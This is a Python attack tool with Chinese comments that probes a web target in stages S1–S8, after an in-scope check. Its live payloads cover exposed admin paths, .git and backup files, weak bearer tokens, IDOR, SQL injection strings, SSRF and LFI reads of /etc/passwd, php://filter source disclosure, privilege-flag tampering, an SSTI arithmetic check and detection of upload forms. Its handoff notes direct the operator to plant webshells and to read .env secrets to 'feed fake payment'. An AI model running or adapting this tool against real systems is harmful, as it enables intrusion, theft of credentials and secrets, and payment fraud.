#!/usr/bin/env python3
"""侦察后黑盒突击层 S1–S8（授权范围内）。

侦察之后、专卡之前。单向量单请求、低噪音。
短字典本层打；--deep 交接已有探针，不另起利用。
本层探针不落马（快面 ≤80 请求）。命中后授权内写马/反弹直接做。
禁止在本探针里喷 SSTI/反序列化 RCE gadget。
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
ROOT = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-strike"
PY = sys.executable
MAX_REQ = 80
REQ_TIMEOUT = 5
# 与 core_web 同针：避免页面里随处可见的 49
SSTI_A, SSTI_NEEDLE = "1337*7", "9359"

ADMIN_MARKERS = ("管理后台", "admin panel", "dashboard", "后台管理")
SUPER_MARKERS = ("总后台", "PLATFORM", "superadmin", "超级管理员")
SECRET_MARKERS = ("card_secret", "api_key", "payment_key", "secret_key")
CONFIG_MARKERS = ("ADMIN_TOKEN", "API_SECRET", "APP_KEY")

SURFACE_PATHS = (
    "/admin",
    "/admin.php",
    "/manage",
    "/api/admin",
    "/api/super.php",
    "/index.php?page=admin",
    "/api/",
    "/api/user",
    "/api/ord",
    "/api/order",
    "/api/login.php",
    "/login",
    "/user/login",
    "/backup.zip",
    "/www.zip",
    "/.git/HEAD",
    "/phpinfo.php",
    "/info.php",
    "/api/render.php",
    "/upload",
    "/api/upload.php",
    "/merchant",
    "/agent",
    "/_next/static/",
    "/elmah.axd",
)

WEAK_TOKENS = ("12345", "admin12345", "123456")
TOKEN_HEADERS = (
    ("Authorization", "Bearer {t}"),
    ("X-Token", "{t}"),
    ("Token", "{t}"),
)

IDOR_PATHS = ("/api/user", "/api/order", "/api/ord")
IDOR_PARAMS = ("id", "user_id", "order_id")
SSRF_PARAMS = ("url", "callback", "target", "redirect", "avatar_url")
LFI_PARAMS = ("file", "page", "path", "template")
PRIV_PARAMS = (("is_admin", "1"), ("role", "admin"), ("super", "1"))

# 禁止裸 mysql_ / ODBC：phpinfo、后台文案会误报
SQL_ERR = re.compile(
    r"You have an error in your SQL|SQL syntax.*near|SQLSTATE\[|"
    r"Unclosed quotation mark|ORA-\d{5}|syntax error at or near|"
    r"mysqli_sql_exception|PDOException|pg_query\(",
    re.I,
)
LFI_HIT = re.compile(r"root:[x*]:0:0:|\[extensions\]|for 16-bit app|^PD9waHA", re.M)
GIT_HEAD = re.compile(r"^ref:\s+refs/", re.M)
PHPINFO = re.compile(r"<h1 class=\"p\">PHP Version|phpinfo\(\)", re.I)
PRIV_RX = re.compile(
    r'"is_admin"\s*:\s*true|"admin"\s*:\s*true|"role"\s*:\s*"admin"',
    re.I,
)
FILE_INPUT_RX = re.compile(r'<input[^>]+type=["\']file["\']', re.I)
JSON_TOKEN_RX = re.compile(
    r'"(?:token|access_token|accessToken|username|userInfo)"\s*:',
    re.I,
)


def _abs(base: str, path: str, params: dict[str, str] | None = None) -> str:
    """合并已有 query，禁止 path?a=1?b=2，并对 SSRF/LFI 值做 urlencode。"""
    raw = path if path.startswith("/") else "/" + path
    joined = urljoin(base.rstrip("/") + "/", raw.lstrip("/"))
    if not params:
        return joined
    parts = urlsplit(joined)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q.update(params)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _next(cmd: str, base: str) -> str:
    return cmd.replace("{base}", base)


def _req(sess: requests.Session, method: str, url: str, **kw: Any) -> requests.Response | None:
    kw.setdefault("timeout", REQ_TIMEOUT)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", False)
    try:
        return sess.request(method, url, **kw)
    except Exception:
        return None


def _body(r: requests.Response | None, n: int = 4000) -> str:
    if r is None:
        return ""
    return (r.text or "")[:n]


def _json_obj(r: requests.Response | None) -> Any:
    if r is None:
        return None
    try:
        return r.json()
    except Exception:
        return None


def _looks_json(text: str) -> bool:
    s = (text or "").lstrip()
    return s.startswith("{") or s.startswith("[")


def _id_in(obj: Any, keys: tuple[str, ...]) -> Any:
    if not isinstance(obj, dict):
        return None
    data = obj.get("data") if isinstance(obj.get("data"), dict) else obj
    if not isinstance(data, dict):
        return None
    for k in keys:
        if k not in data:
            continue
        v = data[k]
        try:
            return int(v)
        except (TypeError, ValueError):
            return v
    return None


def _markers(text: str) -> list[str]:
    hits: list[str] = []
    low = text.lower()
    for label, bag in (
        ("admin", ADMIN_MARKERS),
        ("super", SUPER_MARKERS),
        ("secret", SECRET_MARKERS),
        ("config", CONFIG_MARKERS),
    ):
        for m in bag:
            if m.lower() in low:
                hits.append(f"{label}:{m}")
                break
    return hits


def _live(status: int, length: int, base_status: int, base_len: int) -> bool:
    if status in (401, 403) and status != base_status:
        return True
    if status in (200, 301, 302, 303):
        if status != base_status:
            return True
        if abs(length - base_len) >= 80:
            return True
    return False


def s1_stack_handoff(sess: requests.Session, base: str, budget: list[int]) -> list[dict[str, Any]]:
    """首页指纹交接专卡，不在本层打 Next/ASP.NET/VPN 路径。"""
    r = _req(sess, "GET", _abs(base, "/"))
    budget[0] += 1
    if r is None:
        return []
    blob = ((r.text or "") + " " + " ".join(f"{k}:{v}" for k, v in r.headers.items())).lower()
    hits: list[dict[str, Any]] = []
    rules = (
        (("__next_data__", "x-nextjs", "/_next/static", "next-action"),
         "stack-nextjs",
         "python3 炼蛊房/nextjs_surface_probe.py --base {base} --case <案>"),
        (("__viewstate", "x-aspnet", ".aspxauth", "asp.net_sessionid"),
         "stack-aspnet",
         "python3 炼蛊房/aspnet_surface_probe.py --base {base} --case <案>"),
        (("grpc-status", "application/grpc", "serverreflection"),
         "stack-grpc",
         "python3 炼蛊房/grpc_surface_probe.py --base {base} --case <案>"),
        (("anyconnect", "globalprotect", "fortigate", "webvpn=", "svpncookie"),
         "stack-sslvpn",
         "python3 炼蛊房/sslvpn_surface_probe.py --base {base} --case <案>"),
    )
    for needles, signal, tmpl in rules:
        if any(n in blob for n in needles):
            hits.append({
                "stage": "S1",
                "level": "L1",
                "path": "/",
                "kind": "stack-handoff",
                "signal": signal,
                "next": _next(tmpl, base),
            })
    return hits


def s1_surface(sess: requests.Session, base: str, budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    findings.extend(s1_stack_handoff(sess, base, budget))
    miss = _req(sess, "GET", _abs(base, "/__se_no_such_zz9x__/"))
    b_status = miss.status_code if miss is not None else 404
    b_len = len(miss.content) if miss is not None else 0
    budget[0] += 1
    for path in SURFACE_PATHS:
        if budget[0] >= MAX_REQ:
            break
        r = _req(sess, "GET", _abs(base, path))
        budget[0] += 1
        if r is None:
            continue
        raw = r.content or b""
        length = len(raw)
        text = _body(r)
        if not _live(r.status_code, length, b_status, b_len):
            continue
        kind = "surface"
        marks = _markers(text)
        if GIT_HEAD.search(text):
            kind = "git"
        elif PHPINFO.search(text) and path in ("/phpinfo.php", "/info.php"):
            kind = "phpinfo"
        elif path.endswith(".zip") and r.status_code == 200 and raw.startswith(b"PK"):
            kind = "backup"
        findings.append({
            "stage": "S1",
            "level": "L2" if kind in {"git", "phpinfo", "backup"} or marks else "L1",
            "path": path,
            "status": r.status_code,
            "length": length,
            "kind": kind,
            "signal": ",".join(marks) or kind,
            "next": _next("python3 炼蛊房/dirbrute_probe.py -u {base} --case <案>", base),
        })
    return findings


def s2_auth(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    targets = [p for p in live if any(x in p for x in ("admin", "api", "login", "manage"))][:2]
    if not targets:
        targets = ["/api/"]
    dest = _abs(base, targets[0])
    bare = _req(sess, "GET", dest)
    budget[0] += 1
    bare_st = bare.status_code if bare is not None else 0
    bare_txt = _body(bare)
    for tok in WEAK_TOKENS:
        for hname, hfmt in TOKEN_HEADERS:
            if budget[0] >= MAX_REQ:
                return findings
            r = _req(sess, "GET", dest, headers={hname: hfmt.format(t=tok)})
            budget[0] += 1
            if r is None:
                continue
            text = _body(r)
            auth_up = bare_st in (401, 403) and r.status_code == 200
            json_gain = (
                r.status_code == 200
                and _looks_json(text)
                and JSON_TOKEN_RX.search(text)
                and not JSON_TOKEN_RX.search(bare_txt)
            )
            if auth_up or json_gain:
                findings.append({
                    "stage": "S2",
                    "level": "L2",
                    "path": targets[0],
                    "signal": f"weak-token:{hname}:{tok}",
                    "status": r.status_code,
                    "next": _next("python3 炼蛊房/auth_brute_probe.py -u {base} --case <案>", base),
                })
                return findings
        if budget[0] >= MAX_REQ:
            return findings
        r = _req(sess, "GET", dest, cookies={"token": tok})
        budget[0] += 1
        if r is not None:
            text = _body(r)
            auth_up = bare_st in (401, 403) and r.status_code == 200
            json_gain = (
                r.status_code == 200
                and _looks_json(text)
                and JSON_TOKEN_RX.search(text)
                and not JSON_TOKEN_RX.search(bare_txt)
            )
            if auth_up or json_gain:
                findings.append({
                    "stage": "S2",
                    "level": "L2",
                    "path": targets[0],
                    "signal": f"weak-token:Cookie:{tok}",
                    "status": r.status_code,
                    "next": _next("python3 炼蛊房/auth_brute_probe.py -u {base} --case <案>", base),
                })
                return findings
    if budget[0] < MAX_REQ - 1:
        single = _abs(base, "/api/user", {"id": "1"})
        hpp_url = single + "&id=2" if "?" in single else single + "?id=1&id=2"
        r1 = _req(sess, "GET", single)
        r_hpp = _req(sess, "GET", hpp_url)
        budget[0] += 2
        t1, th = _body(r1), _body(r_hpp)
        if (
            r1 is not None and r_hpp is not None
            and r1.status_code == 200 and r_hpp.status_code == 200
            and _looks_json(t1) and _looks_json(th)
            and t1 != th
            and _id_in(_json_obj(r_hpp), IDOR_PARAMS) in (1, 2)
        ):
            findings.append({
                "stage": "S2",
                "level": "L1",
                "path": "/api/user",
                "signal": "hpp-id-diff",
                "status": r_hpp.status_code,
                "next": "Skill rbac-bypass-authz · authz-probe",
            })
    return findings


def s3_idor(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    paths = [p for p in IDOR_PATHS if p in live] or [p for p in IDOR_PATHS if any(p in x for x in live)]
    if not paths:
        paths = list(IDOR_PATHS[:1])
    for path in paths[:2]:
        for param in IDOR_PARAMS[:2]:
            if budget[0] >= MAX_REQ - 1:
                return findings
            r1 = _req(sess, "GET", _abs(base, path, {param: "1"}))
            r2 = _req(sess, "GET", _abs(base, path, {param: "2"}))
            budget[0] += 2
            if r1 is None or r2 is None:
                continue
            if r1.status_code != 200 or r2.status_code != 200:
                continue
            j1, j2 = _json_obj(r1), _json_obj(r2)
            v1 = _id_in(j1, (param, "id", "user_id", "order_id"))
            v2 = _id_in(j2, (param, "id", "user_id", "order_id"))
            if v1 == 1 and v2 == 2:
                findings.append({
                    "stage": "S3",
                    "level": "L2",
                    "path": path,
                    "signal": f"idor:{param}:1!=2",
                    "next": "万我·信门.md · 填对象矩阵",
                })
                return findings
    return findings


def s4_sqli(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    api_like = next((p for p in live if "api" in p and "login" not in p), "/api/user")
    probes: list[tuple[str, str, dict[str, str]]] = [
        ("GET", api_like, {"id": "1'"}),
        ("GET", "/login", {"username": "admin'--", "password": "x"}),
        ("POST", "/api/login.php", {"username": "admin' OR '1'='1", "password": "x"}),
    ]
    for method, path, params in probes:
        if budget[0] >= MAX_REQ:
            break
        url = _abs(base, path, params if method == "GET" else None)
        kw: dict[str, Any] = {} if method == "GET" else {"data": params}
        r = _req(sess, method, url, **kw)
        budget[0] += 1
        text = _body(r)
        if r is not None and SQL_ERR.search(text):
            findings.append({
                "stage": "S4",
                "level": "L2",
                "path": path,
                "signal": "sql-error",
                "snippet": text[:180],
                "next": "sqlmap_kit / waf_sqli_bypass；登录旁路走 authbypass",
            })
            return findings
    return findings


def s5_ssrf(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    path = next((p for p in live if "render" in p or "upload" in p), None)
    if path is None:
        path = next((p for p in live if p.endswith(".php") and "api" in p), "/api/render.php")
    payloads = ("http://127.0.0.1/", "file:///etc/passwd")
    for param in SSRF_PARAMS[:2]:
        for pay in payloads:
            if budget[0] >= MAX_REQ:
                return findings
            r = _req(sess, "GET", _abs(base, path, {param: pay}))
            budget[0] += 1
            if r is None:
                continue
            text = _body(r)
            passwd = bool(re.search(r"root:[x*]:0:0:", text))
            reflected = ("127.0.0.1" in text or "file://" in text) and (
                "ECONNREFUSED" in text or "Connection refused" in text
            )
            if passwd or reflected:
                findings.append({
                    "stage": "S5",
                    "level": "L2",
                    "path": path,
                    "signal": f"ssrf:{param}",
                    "next": _next(
                        "python3 炼蛊房/ssrf_probe.py scan --base {base} --case <案>",
                        base,
                    ),
                })
                return findings
    return findings


def s6_lfi(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    path = next((p for p in live if "page=" in p or p.startswith("/index.php")), "/index.php")
    payloads = (
        (LFI_PARAMS[1], "../../../../etc/passwd"),
        (LFI_PARAMS[0], "php://filter/convert.base64-encode/resource=index.php"),
    )
    for param, pay in payloads:
        if budget[0] >= MAX_REQ:
            break
        r = _req(sess, "GET", _abs(base, path.split("?")[0], {param: pay}))
        budget[0] += 1
        text = _body(r)
        if r is not None and LFI_HIT.search(text):
            findings.append({
                "stage": "S6",
                "level": "L2",
                "path": path,
                "signal": f"lfi:{param}",
                "next": "Skill lfi-rfi-exploit；读 .env 回灌假支付",
            })
            return findings
    return findings


def s7_priv(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    path = next((p for p in live if "user" in p), None) or next(
        (p for p in live if p.rstrip("/").endswith("api")), "/api/user"
    )
    bare = _req(sess, "GET", _abs(base, path))
    budget[0] += 1
    bare_txt = _body(bare)
    for key, val in PRIV_PARAMS:
        if budget[0] >= MAX_REQ:
            break
        r = _req(sess, "GET", _abs(base, path, {key: val}))
        budget[0] += 1
        text = _body(r)
        if r is None or r.status_code != 200:
            continue
        if text and text != bare_txt and PRIV_RX.search(text) and not PRIV_RX.search(bare_txt):
            findings.append({
                "stage": "S7",
                "level": "L2",
                "path": path,
                "signal": f"priv:{key}={val}",
                "next": _next(
                    "python3 炼蛊房/rbac_bypass_probe.py --base {base} --case <案>",
                    base,
                ),
            })
            return findings
    return findings


def s8_rce_chain(sess: requests.Session, base: str, live: list[str], budget: list[int]) -> list[dict[str, Any]]:
    """只做无害差分。禁止 SSTI RCE gadget，禁止上传 webshell。"""
    findings: list[dict[str, Any]] = []
    if budget[0] < MAX_REQ - 1:
        ctrl = _req(sess, "GET", _abs(base, "/api/", {"q": "xxxx"}))
        probe = _req(sess, "GET", _abs(base, "/api/", {"q": "{{" + SSTI_A + "}}"}))
        budget[0] += 2
        ct, pt = _body(ctrl), _body(probe)
        if probe is not None and SSTI_NEEDLE in pt and SSTI_NEEDLE not in ct:
            findings.append({
                "stage": "S8",
                "level": "L2",
                "path": "/api/",
                "signal": "ssti-arith-9359",
                "next": "Skill ssti-exploit（授权内 RCE/写马直接做）",
            })
    if budget[0] < MAX_REQ:
        r = _req(sess, "GET", _abs(base, "/upload"))
        budget[0] += 1
        text = _body(r)
        if r is not None and r.status_code == 200 and FILE_INPUT_RX.search(text):
            findings.append({
                "stage": "S8",
                "level": "L1",
                "path": "/upload",
                "signal": "upload-form",
                "next": "Skill file-upload-webshell（授权内写马直接做）",
            })
    return findings


def _deep(base: str, case: str, extra: list[str] | None = None) -> list[dict[str, Any]]:
    """交接已有探针，不复制利用。指纹命中则顺带拉起猎面卡。"""
    rows: list[dict[str, Any]] = []
    cmds = [
        [PY, str(OPS / "dirbrute_probe.py"), "-u", base, "--case", case],
        [PY, str(OPS / "auth_brute_probe.py"), "-u", base, "--case", case],
        [PY, str(OPS / "core_web_surface_probe.py"), "-u", base, "--fast", "--case", case],
    ]
    if case:
        cmds.append([PY, str(OPS / "ssrf_probe.py"), "scan", "--base", base, "--case", case])
    seen: set[str] = set()
    for sig in extra or []:
        mapping = {
            "stack-nextjs": "nextjs_surface_probe.py",
            "stack-aspnet": "aspnet_surface_probe.py",
            "stack-grpc": "grpc_surface_probe.py",
            "stack-sslvpn": "sslvpn_surface_probe.py",
        }
        script = mapping.get(sig)
        if not script or script in seen:
            continue
        seen.add(script)
        cmds.append([PY, str(OPS / script), "--base", base, "--case", case])
    env = os.environ.copy()
    for argv in cmds:
        try:
            p = subprocess.run(argv, capture_output=True, text=True, timeout=180, env=env)
            rows.append({
                "cmd": " ".join(argv),
                "rc": p.returncode,
                "out": (p.stdout or "")[-400:],
            })
        except Exception as exc:
            rows.append({"cmd": " ".join(argv), "rc": -1, "out": str(exc)})
    return rows


def run(base_url: str, case: str, out: Path | None, deep: bool, stages: set[str]) -> dict[str, Any]:
    host = host_of(base_url)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or base_url}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = UA
    budget = [0]
    findings: list[dict[str, Any]] = []
    live: list[str] = []

    if "S1" in stages:
        s1 = s1_surface(sess, base, budget)
        findings.extend(s1)
        live = [str(f.get("path")) for f in s1]
    if "S2" in stages:
        findings.extend(s2_auth(sess, base, live, budget))
    if "S3" in stages:
        findings.extend(s3_idor(sess, base, live, budget))
    if "S4" in stages:
        findings.extend(s4_sqli(sess, base, live, budget))
    if "S5" in stages:
        findings.extend(s5_ssrf(sess, base, live, budget))
    if "S6" in stages:
        findings.extend(s6_lfi(sess, base, live, budget))
    if "S7" in stages:
        findings.extend(s7_priv(sess, base, live, budget))
    if "S8" in stages:
        findings.extend(s8_rce_chain(sess, base, live, budget))

    deep_log: list[dict[str, Any]] = []
    if deep:
        extra = [str(f.get("signal") or "") for f in findings if f.get("kind") == "stack-handoff"]
        deep_log = _deep(base, case, extra)

    l2 = [f for f in findings if f.get("level") == "L2"]
    report: dict[str, Any] = {
        "ts": datetime.now(UTC).isoformat(),
        "target": base,
        "host": host,
        "requests": budget[0],
        "stages": sorted(stages),
        "deep": deep,
        "findings": findings,
        "l2_hits": len(l2),
        "deep_log": deep_log,
        "playbook": "传承/春晓苦力·突击.md",
        "skill": "杀招/春晓苦力",
        "next": [
            "S1 → dirbrute_probe（短字典不够再扩）",
            "S2 → auth_brute_probe（弱 token 命中先填矩阵）",
            "S3/S7 → authz-probe / rbac_bypass_probe --base",
            "S4 → sqlmap_kit / waf_sqli_bypass（登录旁路 authbypass）",
            "S5 → ssrf_probe scan",
            "S6/S8 → core_web_surface_probe / file-upload-webshell；授权内写马直接做",
            "有专卡（TP3/XXL/号管/假支付）仍先专卡，本层不替代",
        ],
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="strike", filename="surface.json"
    )
    print(json.dumps({
        "findings": len(findings),
        "l2": len(l2),
        "requests": budget[0],
        "deep": deep,
        "out": str(out_path),
    }, ensure_ascii=False))
    return report


def cmd_doctor() -> int:
    src = Path(__file__).read_text(encoding="utf-8")
    merged = _abs("https://ex.com", "/index.php?page=admin", {"url": "http://127.0.0.1/"})
    checks = [
        ("in_scope", "in_scope" in src and "不在 scope" in src and "not host" in src),
        ("admin-marker", "管理后台" in src),
        ("super-marker", "总后台" in src),
        ("surface-super", "/api/super.php" in src),
        ("weak-token", "admin12345" in src),
        ("s1-s8", all(f"s{i}_" in src or f"S{i}" in src for i in range(1, 9))),
        ("no-webshell", "本层探针不落马" in src and "授权内写马" in src),
        ("no-ssti-rce", "禁止默认 SSTI" in src or "禁止 SSTI RCE" in src),
        ("ssti-rare", "9359" in src and "1337*7" in src),
        ("sql-no-bare-mysql", "mysql_|" not in src.split("SQL_ERR", 1)[-1][:400]),
        ("query-merge", merged.count("?") == 1 and "page=admin" in merged and "url=" in merged),
        ("rbac-cli", "rbac_bypass_probe.py --base" in src),
        ("deep-handoff", "dirbrute_probe.py" in src and "auth_brute_probe.py" in src
         and "core_web_surface_probe.py" in src and "ssrf_probe.py" in src),
        ("write-json", "write_probe_json" in src),
        ("playbook", (ROOT / "传承" / "春晓苦力·突击.md").is_file()),
        ("skill", (ROOT / "杀招" / "strike-probe" / "SKILL.md").is_file()),
    ]
    failed = [n for n, ok in checks if not ok]
    print(f"doctor {len(checks) - len(failed)}/{len(checks)}")
    for n, ok in checks:
        print(f"  {'OK' if ok else 'FAIL'} {n}")
    return 1 if failed else 0


def main() -> int:
    ap = argparse.ArgumentParser(description="侦察后黑盒突击层 S1–S8")
    ap.add_argument("cmd", nargs="?", default="run", help="run | doctor")
    ap.add_argument("-u", "--url", default="")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--deep", action="store_true", help="交接 dirbrute/auth_brute/core_web/ssrf")
    ap.add_argument("--stages", default="S1,S2,S3,S4,S5,S6,S7,S8")
    args = ap.parse_args()
    if args.cmd == "doctor":
        return cmd_doctor()
    if args.cmd not in {"run", "doctor"}:
        ap.error("子命令只能是 run 或 doctor")
    if not args.url:
        ap.error("需要 -u / --url")
    stages = {s.strip().upper() for s in args.stages.split(",") if s.strip()}
    run(args.url, args.case, args.out, args.deep, stages)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
